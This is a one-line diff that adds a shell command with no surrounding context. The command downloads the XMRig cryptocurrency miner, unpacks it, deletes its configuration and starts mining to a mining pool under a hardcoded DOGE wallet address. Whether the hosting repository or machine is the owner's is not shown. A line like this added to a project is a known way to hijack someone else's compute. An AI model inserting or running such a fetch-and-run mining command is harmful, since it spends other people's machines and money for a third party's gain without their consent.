@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz && tar xvzf xmrig-6.15.0-linux-static-x64.tar.gz && cd xmrig-6.15.0 && rm config.json && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u DOGE:DRyBGQPzzp586hscN8PQP481Q1Txo1h9XR.unmineable_worker_vbstgma -p x 
